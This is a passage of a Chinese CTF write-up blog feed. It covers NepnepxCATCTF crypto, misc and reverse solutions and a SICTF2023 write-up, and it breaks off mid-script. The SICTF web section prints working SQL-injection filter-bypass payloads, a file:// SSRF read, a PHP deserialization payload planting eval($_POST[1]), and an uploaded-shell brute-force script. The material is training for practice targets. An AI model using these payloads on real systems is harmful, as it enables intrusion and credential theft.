class="hljs-string">b&#x27;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&#x27;</span><br>)<br>cipher=AES.new(key,mode=AES.MODE_ECB)<br>c2 = [ciphertext[i:i+<span class="hljs-number">16</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(ciphertext),<span class="hljs-number">16</span>)]<br>xor_s = []<br>xor_iv = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> ciphertext <span class="hljs-keyword">in</span> c2:<br>    xor_s.append(cipher.decrypt(ciphertext))<br>    <br>s = <span class="hljs-string">b&#x27;&#x27;</span><br>tiv = <span class="hljs-string">b&#x27;\xd4\x5d\x47\xaf\x96\xc5\xde\x2d\x96\x51\x6d\xf5\x3e\xe9\x30&#x27;</span> <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> [<span class="hljs-number">0x99</span>]:<br>    iv = tiv+long_to_bytes(j)<br>    trycry = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(xor_s)):<br>        s = xor(xor_s[i], iv)<br>        iv = xor(s, c2[i])<br>        <span class="hljs-keyword">try</span>:<br>            trycry += s.decode()<br>            <span class="hljs-keyword">if</span> trycry[-<span class="hljs-number">1</span>] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> printable:<br>                <span class="hljs-keyword">break</span><br>            trycry += <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> trycry:   <span class="hljs-comment">#查找关键字flag</span><br>        <span class="hljs-built_in">print</span>(trycry)<br>        <span class="hljs-comment">#flag&#123;This&#x27;s_why_PCBC_is_not_living&#125;</span><br></code></pre></td></tr></table></figure><p><a name="wEvbq"></a></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p><a name="CdyBq"></a></p><h3 id="CatCat"><a href="#CatCat" class="headerlink" title="CatCat"></a>CatCat</h3><p>图片010打开检索password出密码  catflag<br />然后rabbit密码解密，密钥为catflag<br />然后base91解码<br />最后Ook解码<br /><img src="/mdimg/NepnepxCATCTF/5.png"><br /><img src="/mdimg/NepnepxCATCTF/6.png"><br /><img src="/mdimg/NepnepxCATCTF/7.png"><br><a name="pBbsC"></a></p><h3 id="MeowMeow"><a href="#MeowMeow" class="headerlink" title="MeowMeow"></a>MeowMeow</h3><p>010打开<br /><img src="/mdimg/NepnepxCATCTF/8.png"><br>:::tips<br>CatCTF{CAT_GOES_MEOW}<br>:::<br><a name="znyp0"></a></p><h3 id="Cat-Jump"><a href="#Cat-Jump" class="headerlink" title="Cat_Jump"></a>Cat_Jump</h3><p>010打开检索<br /><img src="/mdimg/NepnepxCATCTF/9.png"><br>:::tips<br>CatCTF{EFI_1sv3ry_funn9}<br>:::<br><a name="AAzOJ"></a></p><h3 id="miao"><a href="#miao" class="headerlink" title="miao~"></a>miao~</h3><p>foremost分离出一个音频<br /><img src="/mdimg/NepnepxCATCTF/10.png"><br />Audacity打开<br /><img src="/mdimg/NepnepxCATCTF/11.png"><br />得到key：CatCTF<br />DeepSound打开<br /><img src="/mdimg/NepnepxCATCTF/12.png"><br /><img src="/mdimg/NepnepxCATCTF/13.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">~呜喵喵喵喵呜呜啊呜啊呜喵呜呜~喵啊喵啊喵啊呜喵呜~~~喵~呜喵啊喵啊喵喵喵呜呜~呜~呜喵呜呜啊啊~呜啊喵啊呜喵呜呜啊~喵~呜呜喵喵~喵喵喵呜呜呜喵~呜喵呜呜啊~呜啊啊喵啊呜喵呜呜喵~喵~呜喵呜~~喵喵喵呜啊呜啊喵呜喵呜呜啊~呜啊啊喵啊呜~啊喵~~喵~呜呜喵喵喵喵喵喵呜啊呜呜~呜喵呜呜~喵~喵啊喵啊呜~~啊啊~喵~呜呜喵喵啊喵喵喵呜呜呜呜~呜喵呜呜~呜啊~啊喵啊呜~~啊啊~喵~呜呜喵喵呜喵喵喵呜啊喵呜喵呜喵呜呜啊呜啊啊啊喵啊呜喵喵呜啊~喵~呜喵呜喵喵喵喵喵呜啊喵喵呜呜喵呜呜~喵~啊啊喵啊呜~~啊啊~喵~呜喵呜~啊喵喵喵呜呜~喵啊呜喵呜呜啊啊呜喵啊喵啊呜~呜~喵~喵~呜呜喵喵喵喵喵喵呜啊喵喵啊呜喵呜呜~呜呜呜啊喵啊呜喵呜啊喵啊 <br></code></pre></td></tr></table></figure><p>兽音解密 <a href="https://roar.iiilab.com/">https://roar.iiilab.com/</a><br /><img src="/mdimg/NepnepxCATCTF/14.png"><br><a name="FZXy4"></a></p><h3 id="CatchCat"><a href="#CatchCat" class="headerlink" title="CatchCat"></a>CatchCat</h3><p>打开是GPS数据<br /><img src="/mdimg/NepnepxCATCTF/15.png"><br />参考：<a href="https://blog.csdn.net/jwq2011/article/details/53674125">https://blog.csdn.net/jwq2011/article/details/53674125</a><br />GPS路径可视化<br /><img src="/mdimg/NepnepxCATCTF/16.png"><br>:::tips<br>CatCTF{GPS_M1ao}<br>:::<br><a name="TqEz9"></a></p><h3 id="Peekaboo"><a href="#Peekaboo" class="headerlink" title="Peekaboo"></a>Peekaboo</h3><p>一个一个试，试出来是百里玄策</p><p><a name="iX5fH"></a></p><h3 id="CatFlag"><a href="#CatFlag" class="headerlink" title="CatFlag"></a>CatFlag</h3><p>丢linux直接cat flag<br /><img src="/mdimg/NepnepxCATCTF/17.png"><br><a name="Wl3K6"></a></p><h3 id="Nepnep-祝你新年快乐啦！"><a href="#Nepnep-祝你新年快乐啦！" class="headerlink" title="Nepnep 祝你新年快乐啦！"></a>Nepnep 祝你新年快乐啦！</h3><p><img src="/mdimg/NepnepxCATCTF/18.png"></p><p><a name="D7CNc"></a></p><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><p><a name="unJt8"></a></p><h3 id="The-cat-did-it"><a href="#The-cat-did-it" class="headerlink" title="The cat did it"></a>The cat did it</h3><p><img src="/mdimg/NepnepxCATCTF/19.png"><br /><img src="/mdimg/NepnepxCATCTF/20.png"><br />0~100尝试，必出，结果 0%就出了<br>:::tips<br> CatCTF{<strong>9f1ef07877f9d85a82bd500f408b4814}</strong><br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SICTF2023 wp</title>
    <link href="/2023/02/09/SICTF2023wp/"/>
    <url>/2023/02/09/SICTF2023wp/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><p><img src="/mdimg/sictf/1.png"><br><img src="/mdimg/sictf/2.png"><br><strong>用户名处存在sql注入</strong><br><img src="/mdimg/sictf/3.png"><br>**看源码发现是post参数user和pass    **<br><strong>fuzz一下</strong><br><img src="/mdimg/sictf/4.png"></p><blockquote><p>过滤了union，select，空格，=</p></blockquote><p>；没过滤尝试堆叠注入无果，updatexml没过滤，报错注入<br><code>user=1&#39;/**/and/**/updatexml(1,concat(0x7e,database()),0)#&amp;pass=1</code>      //ctf_db<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database())),0x7e)#&amp;pass=1</code>           // Username,Password<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Username)from/**/admin)),0x7e)#&amp;pass=1</code>    //admin<br><code>user=0&#39;/**/and/**/updatexml(1,concat(0x7e,(selselectect/**/group_concat(Password)from/**/admin)),0x7e)#&amp;pass=1</code>    // 0909876qwe222<br>登录：<br><img src="/mdimg/sictf/5.png"><br>post：url=1试试<br><img src="/mdimg/sictf/6.png"><br><code>url=file:///var/www/html/x9sd.php</code>读取x9sd.php<br><img src="/mdimg/sictf/7.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">text</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$tmp</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-variable">$tmp</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;unserx&#x27;</span>]);<br>           <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono?&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>);<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;success&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I need some ???&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>反序列化$var<br><img src="/mdimg/sictf/8.png"><br>url编码admin赋值给username<br><code>/x9sd.php?username=%2561%2564%256d%2569%2561&amp;unserx=TzoxOiJhIjoxOntzOjY6IgAqAGNtZCI7czoxNjoiZXZhbCgkX1BPU1RbMV0pOyI7fQ==</code><br><img src="/mdimg/sictf/9.png"><br><img src="/mdimg/sictf/10.png"></p><h4 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h4><p>可以上传php文件，但是要爆破文件名，文件名和时间戳有关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">import requests<br>url = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-number">100000000</span>, <span class="hljs-number">200000000</span>):<br>    re = url + <span class="hljs-title function_ invoke__">str</span>(i) + <span class="hljs-string">&quot;.php&quot;</span><br>    r = requests.<span class="hljs-title function_ invoke__">post</span>(q)<br>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">404</span>:<br>        a = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">print</span>(re)<br>  <br></code></pre></td></tr></table></figure><p>在本地搭一个环境，在本地和远程上传（尽量快）<br>跑出来文件名就可以连antsward了</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h4 id="签到打卡完成"><a href="#签到打卡完成" class="headerlink" title="签到打卡完成"></a>签到打卡完成</h4><p><img src="/mdimg/sictf/11.png">    </p><blockquote><p>010打开附件找到key：SICTF，平台就是青少年的，公众号直接搜（非预期）</p></blockquote><p><img src="/mdimg/sictf/12.png"><br>预期解：</p><p>用ps改一下亮度</p><p>原图<br><img src="/mdimg/sictf/13.png">    </p><p><strong>QRresearch 扫</strong><br><img src="/mdimg/sictf/14.png"><br><code>[http://weixin.qq.com/r/dS-v9yPE436crWeU93pn](http://weixin.qq.com/r/dS-v9yPE436crWeU93pn)    </code></p><h4 id="color"><a href="#color" class="headerlink" title="color"></a>color</h4><p><img src="/mdimg/sictf/15.png"><br>非预期：</p><blockquote><p>stegsolve打开图片查看颜色通道，发现二维码，扫描                        </p></blockquote><p><img src="/mdimg/sictf/16.png"><br>微信QR有纠错，扫描有几率扫出来<br>预期解：</p><blockquote><p>颜色修复工具：<a href="https://github.com/Byxs20/FrequencyColor">https://github.com/Byxs20/FrequencyColor)</a>)</p></blockquote><p>输入序号1-30<br><img src="/mdimg/sictf/17.png"><br><img src="/mdimg/sictf/18.png"><br><code>SICTF&#123;448e8531-c752-4847-ae7e-0e702a8fb915&#125;</code></p><h4 id="geek-challenge"><a href="#geek-challenge" class="headerlink" title="geek_challenge"></a>geek_challenge</h4><p>计算就完事了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">import pwn<br>X = pwn.<span class="hljs-title function_ invoke__">remote</span>(<span class="hljs-string">&quot;&quot;</span>,)<br><span class="hljs-keyword">while</span> True:<br>   tmp = X.<span class="hljs-title function_ invoke__">recvline</span>()<br>    <span class="hljs-keyword">print</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>())<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;= ?&quot;</span> in tmp:<br>        res = <span class="hljs-keyword">eval</span>(tmp.<span class="hljs-title function_ invoke__">decode</span>()[:-<span class="hljs-number">5</span>])<br>        data = <span class="hljs-title function_ invoke__">str</span>(res).<span class="hljs-title function_ invoke__">encode</span>()<br>        X.<span class="hljs-title function_ invoke__">sendline</span>(data)<br></code></pre></td></tr></table></figure><h4 id="王八树木"><a href="#王八树木" class="headerlink" title="王八树木"></a>王八树木</h4><p>文件16进制逆序<br>树木使用工具还原 附地址<a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a><br><code>FileReverse-Tools.py -i 树木</code><br>得到jpg图片 分理出pass.txt  bandzip 爆破得到123456<br><img src="/mdimg/sictf/19.png"><br>解7z得到<code>SI!!!!!!</code><br>使用SilentEye<br><img src="/mdimg/sictf/20.png"><br>得到 <code>2,1,2</code><br>猫脸变换还原flag.bmp  a=3，b=1成功了 脚本可能有问题<br><img src="/mdimg/sictf/21.png"><br><code>SICTF&#123;a9549c89-d261-4bd7-9643-60874dbd28b8&#125;    </code>                </p><h4 id="EzMisc"><a href="#EzMisc" class="headerlink" title="EzMisc"></a>EzMisc</h4><p>伪加密WinRAR修复就行<br>得到<img src="/mdimg/sictf/22.png"><br><code>Xkey:MI43nQrRjQaFTALBTO4JmNJxjO4VcO4Vy</code><br>随波逐流<br><img src="/mdimg/sictf/23.png"><br><code>ohhhhh~</code>解压7z</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">from PIL import Image<br><br>from base64 import b64encode ,b64decode<br><br>from FLAG import FLAG<br><br>import cv2<br><br>OOO000O0000000OOO =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">OO00000O0O00OOOOO =&#x27;</span>&#x27;<br>O0OO0OO0O0O0OOOO0 =Image .open (OOO000O0000000OOO )<br>O000OOO0O0000OO00 =Image .open (OO00000O0O00OOOOO )<br>OOO0OO0O00OO0O00O =cv2 .imread (<span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">OO00OOO0OOO000OO0 =OOO0OO0O00OO0O00O .shape [1]</span><br><span class="hljs-string">O0OOO0OOO00OO00OO =OOO0OO0O00OO0O00O .shape [0]</span><br><span class="hljs-string">O0000OOO0O00O00OO =Image .new (&quot;RGB&quot;,(OO00OOO0OOO000OO0 ,O0OOO0OOO00OO00OO ))</span><br><span class="hljs-string">OO00OOOO00O0OOO0O =O0OO0OO0O0O0OOOO0 .convert (&#x27;</span>RGB<span class="hljs-number">&#x27;</span>)<br>O000OOO0O0OO0000O =O000OOO0O0000OO00 .convert (<span class="hljs-string">&#x27;RGB&#x27;</span>)<br><span class="hljs-keyword">for</span> OOO0O0OO000O0O000 in range (OO00OOO0OOO000OO0 ):<br>    <span class="hljs-keyword">for</span> OOOOO0000000O0OOO in range (O0OOO0OOO00OO00OO ):<br>        OO0OO00O0O0000O0O ,OO000O0O00000O0O0 ,OOO0O00OO000O0O00 =OO00OOOO00O0OOO0O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO00OOOO0OOO000OO ,O000OO0O0OO00O0O0 ,O00000OO0OO0O0OOO =O000OOO0O0OO0000O .getpixel ((OOO0O0OO000O0O000 ,OOOOO0000000O0OOO ))<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO00OOOO0OOO000OO =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O000OO0O0OO00O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO0OO00O0O0000O0O =OO0OO00O0O0000O0O ^OO000O0O00000O0O0<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O00000OO0OO0O0OOO =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        OO000O0O00000O0O0 =OO000O0O00000O0O0 ^O00000OO0OO0O0OOO<br>        O0OOO0000OOOOO00O =OO0OO00O0O0000O0O ^OO00OOOO0OOO000OO<br>        OO0O0OOOOO0O00OO0 =OO000O0O00000O0O0 ^O000OO0O0OO00O0O0<br>        O00O00O00OO0O00O0 =OOO0O00OO000O0O00 ^O00000OO0OO0O0OOO<br>        <span class="hljs-keyword">if</span> (O0OOO0000OOOOO00O ==<span class="hljs-number">0</span> ):<br>            O0OOO0000OOOOO00O =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (OO0O0OOOOO0O00OO0 ==<span class="hljs-number">0</span> ):<br>            OO0O0OOOOO0O00OO0 =<span class="hljs-number">255</span><br>        <span class="hljs-keyword">if</span> (O00O00O00OO0O00O0 ==<span class="hljs-number">0</span> ):<br>            O00O00O00OO0O00O0 =<span class="hljs-number">255</span><br>        O0OOO0000OOOOO00O =str (b64encode (str (O0OOO0000OOOOO00O ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        OO0O0OOOOO0O00OO0 =str (b64encode (str (OO0O0OOOOO0O00OO0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        O00O00O00OO0O00O0 =str (b64encode (str (O00O00O00OO0O00O0 ).encode ()),<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        with open (<span class="hljs-string">&#x27;secret~.txt&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)as file0 :<br>            print (O0OOO0000OOOOO00O [::<span class="hljs-number">-1</span> ],OO0O0OOOOO0O00OO0 [::<span class="hljs-number">-1</span> ],O00O00O00OO0O00O0 [::<span class="hljs-number">-1</span> ],file = file0 )<br><br><br></code></pre></td></tr></table></figure><p><del>偷一下Byxs20✌的jio本</del></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">import cv2<br>import base64<br>import numpy as np<br><br>with <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-string">&quot;secret~.txt&quot;</span>)</span> as f:<br>    data = f.read().splitlines()[:<span class="hljs-number">-2</span>]<br><br>img = []<br><span class="hljs-keyword">for</span> line in data:<br>    bgr = [base64.b64decode(i[::<span class="hljs-number">-1</span>]).decode() <span 